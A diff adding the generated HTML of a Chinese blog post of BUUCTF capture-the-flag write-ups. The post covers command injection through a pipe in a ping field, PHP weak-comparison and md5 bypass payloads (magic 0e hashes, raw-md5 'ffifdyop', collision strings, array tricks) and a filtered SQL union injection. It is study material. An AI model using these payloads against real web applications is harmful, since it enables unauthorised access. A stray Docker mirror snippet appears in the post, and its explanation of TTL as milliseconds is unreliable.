@@ -1,37 +1,1165 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
 
 
-{% block title %}{{ page.title }} | {{ config.title }}{% endblock %}
 
-{% block page_class %}page-post-detail{% endblock %}
+  
 
 
-{% block content %}
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="靶场," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="[ACTF2020 新生赛]Exec 1在 CTF 中，flag 文件往往位于根目录下，但也不要被反套路了先ping一下它自己TTL表示您使用ping命令发送的数据包在网络中的持续时间。TTL&#x3D;56表示你的机器发送数据包到对方IP并确认，要花费56毫秒。一般情况下，TTL&#x3D;56表示对方是Windows 98或者是Linux操作系统尝试使用管道符127.0.0.1 | ls &amp;#">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF">
+<meta property="og:url" content="http://example.com/BUUCTF.html">
+<meta property="og:site_name" content="yzklov">
+<meta property="og:description" content="[ACTF2020 新生赛]Exec 1在 CTF 中，flag 文件往往位于根目录下，但也不要被反套路了先ping一下它自己TTL表示您使用ping命令发送的数据包在网络中的持续时间。TTL&#x3D;56表示你的机器发送数据包到对方IP并确认，要花费56毫秒。一般情况下，TTL&#x3D;56表示对方是Windows 98或者是Linux操作系统尝试使用管道符127.0.0.1 | ls &amp;#">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/74.png">
+<meta property="og:image" content="http://example.com/img/75.png">
+<meta property="og:image" content="http://example.com/img/76.png">
+<meta property="og:image" content="http://example.com/img/200.png">
+<meta property="og:image" content="http://example.com/img/201.png">
+<meta property="article:published_time" content="2023-04-16T02:45:20.000Z">
+<meta property="article:modified_time" content="2023-08-08T10:34:47.083Z">
+<meta property="article:author" content="yzklov">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/74.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/BUUCTF.html"/>
+
+
+
+
+
+  <title>BUUCTF | yzklov</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">yzklov</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">nanashi</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
 
   <div id="posts" class="posts-expand">
-    {{ post_template.render(page) }}
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/BUUCTF.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">BUUCTF</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-04-16T10:45:20+08:00">
+                2023-04-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="ACTF2020-新生赛-Exec-1"><a href="#ACTF2020-新生赛-Exec-1" class="headerlink" title="[ACTF2020 新生赛]Exec 1"></a>[ACTF2020 新生赛]Exec 1</h2><p>在 CTF 中，flag 文件往往位于根目录下，但也不要被反套路了<br>先ping一下它自己<br><img src="/img/74.png"><br>TTL表示您使用ping命令发送的数据包在网络中的持续时间。<br>TTL&#x3D;56表示你的机器发送数据包到对方IP并确认，要花费56毫秒。<br>一般情况下，TTL&#x3D;56表示对方是Windows 98或者是Linux操作系统<br>尝试使用管道符<br>127.0.0.1 | ls &#x2F;查看根目录文件<br>127.0.0.1 | cat &#x2F;flag 查看根目录下的flag文件<br><img src="/img/75.png"><br><img src="/img/76.png"><br>得到flag</p>
+<h2 id="BUUCTF-BJDCTF2020-Easy-MD51"><a href="#BUUCTF-BJDCTF2020-Easy-MD51" class="headerlink" title="BUUCTF [BJDCTF2020]Easy MD51"></a>BUUCTF [BJDCTF2020]Easy MD51</h2><p>1、 PHP md5() 函数</p>
+<ul>
+<li>语法：md5(string,raw) </li>
+<li>string：需要计算的字符串</li>
+<li>raw:规定十六进制或二进制输出格式<br>TRUE - 原始 16 字符二进制格式<br>FALSE - 默认 32 字符十六进制数<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$str = &quot;ffifdyop&quot;; </span><br><span class="line">echo &quot;TRUE - Raw 16 character binary format: &quot;.md5($str, TRUE).&quot;&lt;br&gt;&quot;; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+结果：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TRUE - Raw 16 character binary format: &#x27;or&#x27;6�]��!r,��b&lt;br&gt;</span><br></pre></td></tr></table></figure>
+ffifdyop的原始 16 字符二进制格式以’or’6开头，数字开头的字符串都会被识别为True，可以用作注入拼接</li>
+</ul>
+<p><strong>php比较绕过</strong></p>
+<ul>
+<li>php是一种弱类型语言，对数据的类型要求并不严格，可以让数据类型互相转换<br>1、使用两个等号 &#x3D;&#x3D; 比较，只比较值，不比较类型。<br>2、用三个等号 &#x3D;&#x3D;&#x3D; 比较，除了比较值，也比较类型。</li>
+</ul>
+<h3 id="字符串和数字比较"><a href="#字符串和数字比较" class="headerlink" title="字符串和数字比较"></a>字符串和数字比较</h3><ul>
+<li>字符串和数字比较使用&#x3D;&#x3D;时，若字符串以数字开头，则取开头数字作为转换结果，不能转换为数字的字符串或null，则转换为0<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var_dump(12==&quot;12&quot;)                                 //true</span><br><span class="line">var_dump(12==&quot;12aa&quot;)                               //true</span><br><span class="line">var_dump( &quot;admin&quot;==0)							    //true</span><br><span class="line">var_dump(false==&quot;&quot;==0==NULL)						//true</span><br><span class="line"></span><br><span class="line">var_dump(&#x27;a&#x27; == 0);	    //bool(true)</span><br><span class="line">var_dump(&#x27;1a&#x27; == 1);	//bool(true)</span><br><span class="line">var_dump(&#x27;12a&#x27; == 1);	//bool(false)</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="字符串和布尔型"><a href="#字符串和布尔型" class="headerlink" title="字符串和布尔型"></a>字符串和布尔型</h3><ul>
+<li>布尔值true和任意字符串都弱相等，除了0和false，因为0也认为是bool false，true是不等于false的<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var_dump(true==&quot;hyuf&quot;)                   //true</span><br><span class="line">var_dump(True == 0);	                 //bool(false)</span><br><span class="line">var_dump(True == &#x27;False&#x27;);	             //bool(true)</span><br><span class="line">var_dump(True == 2);	                 //bool(true)</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="字符串”0”和科学计数法"><a href="#字符串”0”和科学计数法" class="headerlink" title="字符串”0”和科学计数法"></a>字符串”0”和科学计数法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$str1 = &quot;a&quot;;</span><br><span class="line">echo md5($str1);	//0cc175b9c0f1b6a831c399e269772661</span><br><span class="line">var_dump(md5($str1) == &#x27;0&#x27;);	//bool(false)</span><br><span class="line">---------------------------------------------------------</span><br><span class="line">$str2 = &quot;s224534898e&quot;;</span><br><span class="line">echo md5($str2);	//0e420233178946742799316739797882</span><br><span class="line">var_dump(md5($str2) == &#x27;0&#x27;);	//bool(true)</span><br><span class="line">---------------------------------------------------------</span><br><span class="line">$str3 = &#x27;a1b2edaced&#x27;;</span><br><span class="line">echo md5($str3);	//0e45ea817f33691a3dd1f46af81166c4bool</span><br><span class="line">var_dump(md5($str3) == &#x27;0&#x27;);	//bool(false)</span><br><span class="line">---------------------------------------------------------</span><br><span class="line">var_dump(&#x27;0e111111111111&#x27; == &#x27;0&#x27;);	//bool(true) </span><br></pre></td></tr></table></figure>
+<ul>
+<li>开头前两个为0e，后面全部为数字的话，他们就会和字符串0相等的<br>1、第一条只是0开头，所以只能当普通字符串，结果为false<br>2、第二条0e后面全为数字，符合要求，结果为true<br>3、第三条虽然为0e，但是后面不全为数字，所以结果为false<br>4、数字和“e”开头加上数字的字符串（例如”1e123”）会当作科学计数法去比较</li>
+</ul>
+<h3 id="strcmp-函数漏洞-php5-3之前"><a href="#strcmp-函数漏洞-php5-3之前" class="headerlink" title="strcmp() 函数漏洞 php5.3之前"></a>strcmp() 函数漏洞 php5.3之前</h3><ul>
+<li>strcmp(s1,s2)<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">当s1&lt;s2时，返回为负数 注意不一定是-1，测试结果是比较字符串长度</span><br><span class="line">当s1==s2时，返回值= 0</span><br><span class="line">当s1&gt;s2时，返回正数 注意不一定是1，测试结果是比较字符串长度</span><br><span class="line">如果两个字符串不同等，但是字符串长度相同，就比较从哪一位开始不同的，然后比较那一位的大小</span><br><span class="line">即：两个字符串自左向右逐个字符相比（按ASCII值大小相比较），直到出现不同的字符或遇&#x27;\0&#x27;为止。如：</span><br><span class="line">&quot;A&quot;&lt;&quot;B&quot; &quot;a&quot;&gt;&quot;A&quot; &quot;computer&quot;&gt;&quot;compare&quot;</span><br></pre></td></tr></table></figure></li>
+<li>利用点：这里面只能比较字符串，不能比较数字等其他形式的参数，如果出现了其它参数，则会retrun null，有些题目就是利用这一点来进行和0的完成比较<br>一般使用<strong>数组</strong>来触发</li>
+</ul>
+<h3 id="MD5绕过"><a href="#MD5绕过" class="headerlink" title="MD5绕过"></a>MD5绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if(MD5($_GET[&#x27;name&#x27;]) == MD5($_GET[&#x27;password&#x27;]))&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">//name[]=1&amp;password[]=2</span><br><span class="line">PHP中md5()函数无法处理数组（会返回NULL）</span><br><span class="line">==的也可以用数组绕过</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$a = $GET[&#x27;a&#x27;];</span><br><span class="line">$b = $_GET[&#x27;b&#x27;];</span><br><span class="line"></span><br><span class="line">if($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class="line">    // wow, glzjin wants a girl friend.</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+<p>GET传入a和b要求a不等于b，且a和b的md5值相同,md5的绕过</p>
+<ul>
+<li>方法一：利用数组绕过，md5()不能处理数组，传入数组会返回null<br>payload如下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure></li>
+<li>方法二：在php中以“0e”开头的字符串都会以科学计数法来解析，而0的乘积都为0。所以构造md5加密后开头为0e的字符串即可<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br></pre></td></tr></table></figure>
+下面是强比较<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if($_POST[&#x27;param1&#x27;]!==$_POST[&#x27;param2&#x27;]&amp;&amp;md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+方法一：数组绕过<br>payload：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1[]=1&amp;param2[]=2</span><br></pre></td></tr></table></figure>
+方法二：使用md5加密后两个完全相等的两个字符串绕过</li>
+<li>md5无论是32位还是16位，都不可能不重复的表示所有信息，这种重复的例子就称为<strong>硬碰撞</strong>，有如下代码：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$s1 = $_GET[&#x27;a&#x27;];</span><br><span class="line">$s2 = $_GET[&#x27;b&#x27;];</span><br><span class="line">$s3 = $_GET[&#x27;c&#x27;];</span><br><span class="line">echo md5($s1),&quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo md5($s2),&quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo md5($s3),&quot;&lt;br/&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+payload:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?a=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab</span><br><span class="line">&amp;b=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab</span><br><span class="line">&amp;c=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab</span><br></pre></td></tr></table></figure>
+三个返回相同的md5值<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ea8b4156874b91a4ef00c5ca3e4a4a34</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="双md5碰撞绕过"><a href="#双md5碰撞绕过" class="headerlink" title="双md5碰撞绕过"></a>双md5碰撞绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">md5(md5(CbDLytmyGm2xQyaLNhWn)) =&gt; 0e3a5f2a80db371d4610b8f940d296af</span><br><span class="line">md5(md5(770hQgrBOjrcqftrlaZk)) =&gt; 0e2756da68ef740fd8f5a5c26cc45064</span><br><span class="line">md5(md5(7r4lGXCH2Ksu2JNT3BYM)) =&gt; 0e48d320b2a97ab295f5c4694759889f</span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CbDLytmyGm2xQyaLNhWn</span><br><span class="line">770hQgrBOjrcqftrlaZk</span><br><span class="line">7r4lGXCH2Ksu2JNT3BYM</span><br></pre></td></tr></table></figure>
+<h3 id="md5碰撞脚本"><a href="#md5碰撞脚本" class="headerlink" title="md5碰撞脚本"></a>md5碰撞脚本</h3><h3 id="intval-函数"><a href="#intval-函数" class="headerlink" title="intval() 函数"></a>intval() 函数</h3><ul>
+<li>intval() 函数用于获取变量的整数值</li>
+<li>通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值，intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1</li>
+<li>语法：<code>int intval ( mixed $var [, int $base = 10 ] )</code><br>如果 base 是 0，通过检测 var 的格式来决定使用的进制：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果字符串包括了 &quot;0x&quot; (或 &quot;0X&quot;) 的前缀，使用 16 进制 (hex)</span><br><span class="line">如果字符串以 &quot;0&quot; 开始，使用 8 进制(octal)</span><br><span class="line">否则将使用 10 进制 (decimal)</span><br></pre></td></tr></table></figure>
+绕过方法：通过使用0x或者0开始的格式来绕过不相等的判断（像一些要先判断不相等再判断相等的题目）</li>
+</ul>
+<h2 id="极客大挑战-2019-BuyFlag-1"><a href="#极客大挑战-2019-BuyFlag-1" class="headerlink" title="[极客大挑战 2019]BuyFlag 1"></a>[极客大挑战 2019]BuyFlag 1</h2><ul>
+<li><p>is_numeric() 函数用于检测变量是否为数字<br>利用：is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值</p>
+</li>
+<li><p>bp修改请求方式<br>右键，change request method</p>
+</li>
+</ul>
+<p>{<br>  “registry-mirrors”: [“<a target="_blank" rel="noopener" href="https://qlmy5iw9.mirror.aliyuncs.com"]">https://qlmy5iw9.mirror.aliyuncs.com&quot;]</a><br>}</p>
+<h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>先在user页面找到注入点no&#x3D; ，然后测试’发现可能存在sql注入，发现是数字型，继续测试到union select 1，2，3，4时出现提示<code>no hack ~_~</code>,使用fuzz字典测试注入点<br><img src="/img/200.png"><br>union select被过滤，<code>union/**/select</code>中代替空格，常规联合注入</p>
